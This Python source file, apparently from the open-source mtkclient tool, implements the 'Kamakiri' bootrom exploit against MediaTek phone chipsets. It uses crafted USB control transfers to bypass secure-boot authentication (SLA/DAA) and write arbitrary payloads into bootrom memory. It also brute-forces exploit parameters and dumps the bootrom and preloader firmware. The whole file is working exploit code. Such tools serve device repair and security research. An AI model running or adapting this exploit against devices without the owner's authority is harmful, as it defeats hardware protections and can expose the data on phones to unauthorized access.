#!/usr/bin/python3
# -*- coding: utf-8 -*-
# (c) B.Kerler 2018-2021 GPLv3 License
import logging
import array
import time
import os
from struct import pack, unpack
from mtkclient.Library.utils import LogBase, print_progress, revdword, logsetup
from mtkclient.Library.Connection.usblib import usb
from mtkclient.config.payloads import pathconfig


class Kamakiri(metaclass=LogBase):
    def __init__(self, mtk, loglevel=logging.INFO):
        self.__logger = logsetup(self, self.__logger, loglevel, mtk.config.gui)
        self.lasterror = ""
        self.mtk = mtk
        self.chipconfig = self.mtk.config.chipconfig
        self.var1 = self.chipconfig.var1
        self.linecode = None
        self.pathconfig = pathconfig()

    def fix_payload(self, payload, da=True):
        payload = bytearray(payload)
        wd = unpack("<I", payload[-4:])[0]
        ua = unpack("<I", payload[-8:-4])[0]
        if wd == 0x10007000:
            payload[-4:] = pack("<I", self.mtk.config.chipconfig.watchdog)
        if ua == 0x11002000:
            payload[-8:-4] = pack("<I", self.mtk.config.chipconfig.uart)
        while len(payload) % 4 != 0:
            payload.append(0)
        if da:
            payload.extend(b"\x00" * 0x100)  # signature len
        return payload

    def exploit(self, payload, payloadaddr):
        addr = self.mtk.config.chipconfig.watchdog + 0x50
        self.mtk.preloader.write32(addr, [revdword(payloadaddr)])
        for i in range(0, 0xF):
            self.mtk.preloader.read32(addr - (0xF - i) * 4, 0xF - i + 1)
        self.mtk.port.echo(b"\xE0")
        self.mtk.port.echo(pack(">I", len(payload)))
        status = int.from_bytes(self.mtk.port.usbread(2), byteorder="little")
        if status:
            raise Exception("Kamakiri Payload is too large")
        self.mtk.port.usbwrite(payload)
        self.mtk.port.usbread(2)
        self.mtk.port.usbread(2)

        # noinspection PyProtectedMember
        udev = usb.core.find(idVendor=0x0E8D, idProduct=0x3)
        try:
            # noinspection PyProtectedMember
            udev._ctx.managed_claim_interface = lambda *args, **kwargs: None
        except AttributeError as e:
            raise RuntimeError("libusb is not installed for port {}".format(udev.dev.port)) from e

        try:
            udev.ctrl_transfer(0xA1, 0, 0, self.var1, 0)
        except usb.core.USBError as e:
            self.lasterror = str(e)
            del udev
        return True

    def da_read(self, address, length, check_result=True):
        return self.da_read_write(address, length, None, check_result)

    def da_write(self, address, length, data, check_result=True):
        return self.da_read_write(address, length, data, check_result)

    def kamakiri2(self, addr):
        self.udev = self.mtk.port.cdc.device
        try:
            self.udev.ctrl_transfer(0x21, 0x20, 0, 0, self.linecode + array.array('B', pack("<I", addr)))
            self.udev.ctrl_transfer(0x80, 0x6, 0x0200, 0, 9)
        except:
            pass

    def da_read_write(self, address, length, data=None, check_result=True):
        self.udev = self.mtk.port.cdc.device
        try:
            self.mtk.preloader.brom_register_access(0, 1)
            self.mtk.preloader.read32(self.mtk.config.chipconfig.watchdog + 0x50)
        except:
            pass

        ptr_da = None
        if self.mtk.config.chipconfig.brom_register_access is not None:
            ptr_da = self.mtk.config.chipconfig.brom_register_access[0][1]
        if ptr_da is None:
            assert "Unknown cpu config. Please try to dump brom and send to the author"
        # 0x40404000
        for i in range(3):
            self.kamakiri2(ptr_da + 8 - 3 + i)

        if address < 0x40:
            # 0x0
            for i in range(4):
                self.kamakiri2(ptr_da - 6 + (4 - i))
            return self.mtk.preloader.brom_register_access(address, length, data, check_result)
        else:
            # 0x00000040
            for i in range(3):
                self.kamakiri2(ptr_da - 5 + (3 - i))
            return self.mtk.preloader.brom_register_access(address - 0x40, length, data, check_result)

    def exploit2(self, payload, payloadaddr=None):
        # noinspection PyProtectedMember
        if payloadaddr is None:
            payloadaddr = self.chipconfig.brom_payload_addr
        try:
            # self.mtk.port.cdc.device.reset()
            if self.linecode is None:
                self.linecode = self.mtk.port.cdc.device.ctrl_transfer(0xA1, 0x21, 0, 0, 7) + array.array('B', [0])
            ptr_send = unpack("<I", self.da_read(self.mtk.config.chipconfig.send_ptr[0][1], 4))[0] + 8
            self.da_write(payloadaddr, len(payload), payload)
            self.da_write(ptr_send, 4, pack("<I", payloadaddr), False)
        except usb.core.USBError as e:
            print("USB CORE ERROR")
            print(e)
        return True

    def payload(self, payload, addr, forcekamakiri=True, exploittype=1):
        if self.mtk.config.target_config["sla"] or self.mtk.config.target_config["daa"] or forcekamakiri:
            try:
                payload = self.fix_payload(bytearray(payload), False)
            except:
                pass

            if exploittype == 1:
                self.info("Trying kamakiri..")
                if self.exploit(payload, addr):
                    self.info("Done sending payload...")
                    return True
            elif exploittype == 2:
                self.info("Trying kamakiri2..")
                if self.exploit2(payload, addr):
                    self.info("Done sending payload...")
                    time.sleep(0.2)
                    return True
        else:
            self.info("Sending payload via insecure da.")
            payload = self.fix_payload(payload, True)
            if self.mtk.preloader.send_da(addr, len(payload) - 0x100, 0x100, payload):
                if self.mtk.preloader.jump_da(addr):
                    self.info("Done sending payload...")
                    return True
        self.error("Error on sending payload.")
        return False

    def bruteforce2(self, args, startaddr=0x9900):
        found = False
        while not found:
            # self.mtk.init()
            self.mtk.preloader.display = False
            if self.mtk.preloader.init(display=False):
                self.mtk = self.mtk.crasher(display=False)
                self.info("Bruteforce, testing " + hex(startaddr) + "...")
                if self.linecode is None:
                    self.linecode = self.mtk.port.cdc.device.ctrl_transfer(0xA1, 0x21, 0, 0, 7) + array.array('B', [0])
                found, startaddr = self.newbrute(startaddr)
                if found:
                    filename = args.filename
                    if filename is None:
                        cpu = ""
                        if self.mtk.config.cpu != "":
                            cpu = "_" + self.mtk.config.cpu
                        filename = "brom" + cpu + "_" + hex(self.mtk.config.hwcode)[2:] + ".bin"
                    self.info("Found " + hex(startaddr) + f", dumping bootrom to {filename}")
                    self.dump_brom2(startaddr, filename)
                    break
                else:
                    print("Please dis- and reconnect device to brom mode to continue ...")
                    self.mtk.port.close()
        return True

    def newbrute(self, dump_ptr, dump=False):
        udev = usb.core.find(idVendor=0x0E8D, idProduct=0x3)
        if udev is None:
            return None
        addr = self.mtk.config.chipconfig.watchdog + 0x50
        try:
            # noinspection PyProtectedMember
            udev._ctx.managed_claim_interface = lambda *args, **kwargs: None
        except AttributeError as e:
            raise RuntimeError("libusb is not installed for port {}".format(udev.dev.port)) from e

        if dump:
            try:
                self.mtk.preloader.brom_register_access(0, 1)
                self.mtk.preloader.read32(addr)
            except:
                pass

            for i in range(4):
                self.kamakiri2(dump_ptr - 6 + (4 - i))

            brom = bytearray(self.mtk.preloader.brom_register_access(0, 0x20000))
            brom[dump_ptr - 1:] = b"\x00" + int.to_bytes(0x100030, 4, 'little') + brom[dump_ptr + 4:]
            return brom

        else:
            try:
                self.mtk.preloader.brom_register_access(0, 1)
                self.mtk.preloader.read32(addr)
            except:
                pass

            for address in range(dump_ptr, 0xffff, 4):
                if address % 0x100 == 0:
                    self.info("Bruteforce, testing " + hex(address) + "...")
                for i in range(3):
                    self.kamakiri2(address - 5 + (3 - i))
                try:
                    if (len(self.mtk.preloader.brom_register_access(0, 0x40))) == 0x40:
                        return True, address
                except RuntimeError:
                    try:
                        self.info("Bruteforce, testing " + hex(address) + "...")
                        self.mtk.preloader.read32(addr)
                    except:
                        return False, address + 4
                except Exception:
                    return False, address + 4
        return False, dump_ptr + 4

    def bruteforce(self, args):
        var1 = self.chipconfig.var1
        filename = os.path.join(self.pathconfig.get_payloads_path(), "generic_dump_payload.bin")
        try:
            with open(filename, "rb") as rf:
                payload = rf.read()
                self.info(f"Loading payload from {filename}, {hex(len(payload))} bytes")
        except FileNotFoundError:
            self.info(f"Couldn't open {filename} for reading.")
            return False

        exploittype = 1
        for i in range(var1, 0xFF):
            var1 = i
            self.warning("Trying var1 of %02X, please reconnect/connect device into bootrom mode" % var1)
            while True:
                self.mtk.init()
                self.mtk.preloader.display = False
                if self.mtk.preloader.init():
                    addr = self.mtk.config.chipconfig.brom_payload_addr
                    rmtk = self.mtk.crasher(display=False)
                    try:
                        filename = args.filename
                        if filename is None:
                            cpu = ""
                            if rmtk.config.cpu != "":
                                cpu = "_" + rmtk.config.cpu
                            filename = "brom" + cpu + "_" + hex(rmtk.config.hwcode)[2:] + ".bin"
                        try:
                            self.var1 = var1
                            self.payload(payload, addr, True, exploittype)
                            if self.dump_brom(filename):
                                self.warning("Found a possible var1 of 0x%x" % var1)
                                return True
                        except Exception as e:
                            print(e)
                            rmtk.port.close()
                            time.sleep(0.1)
                            del rmtk
                    except Exception as err:
                        self.debug(str(err))
                        time.sleep(0.1)
                        pass
                    break

        self.warning(f"Var1 of {hex(var1)} possibly failed, please wait a few seconds " +
                     "and then reconnect the mobile to bootrom mode")

        if var1 == 0xFF:
            self.error("Couldn't find the right var1 value.")
        self.close()
        return False

    def dump_brom(self, filename):
        try:
            with open(filename, 'wb') as wf:
                print_progress(0, 100, prefix='Progress:', suffix='Complete', bar_length=50)
                length = self.mtk.port.usbread(4)
                length = int.from_bytes(length, 'big')
                rlen = min(length, 0x20000)
                for i in range(length // rlen):
                    data = self.mtk.port.usbread(rlen)
                    wf.write(data)
                    print_progress(i, length // rlen, prefix='Progress:', suffix='Complete', bar_length=50)
                print_progress(100, 100, prefix='Progress:', suffix='Complete', bar_length=50)
                return True
        except Exception as e:
            self.error(f"Error on opening {filename} for writing: {str(e)}")
            return False

    def dump_preloader(self):
        try:
            filename = ""
            length = unpack("<I", self.mtk.port.usbread(4))[0]
            if length > 0:
                data = self.mtk.port.usbread(length)
                idx = data.find(b"MTK_BLOADER_INFO")
                if idx != -1:
                    filename = data[idx + 0x1B:idx + 0x1B + 0x30].rstrip(b"\x00").decode('utf-8')
                return data, filename
            return None, None
        except Exception as e:
            self.error(f"Error on opening {filename} for writing: {str(e)}")
        return None, None

    def dump_brom2(self, dump_ptr, filename):
        try:
            with open(filename, 'wb') as wf:
                wf.write(self.newbrute(dump_ptr, True))
                print_progress(100, 100, prefix='Progress:', suffix='Complete', bar_length=50)
                return True
        except Exception as e:
            self.error(f"Error on opening {filename} for writing: {str(e)}")
            return False
